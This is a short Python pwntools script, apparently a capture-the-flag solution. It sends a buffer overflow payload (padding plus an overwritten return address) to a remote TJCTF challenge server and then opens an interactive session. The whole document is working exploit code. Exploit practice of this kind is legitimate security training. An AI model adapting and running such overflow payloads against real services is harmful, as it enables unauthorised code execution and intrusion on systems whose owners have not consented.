from pwn import *

payload = 'A'*18 + p64(0x00000000004006e3)

p = remote('p1.tjctf.org', 8009)

print p.recvuntil('?')
p.sendline(payload)
print p.recvline()
print p.recv()
p.interactive()
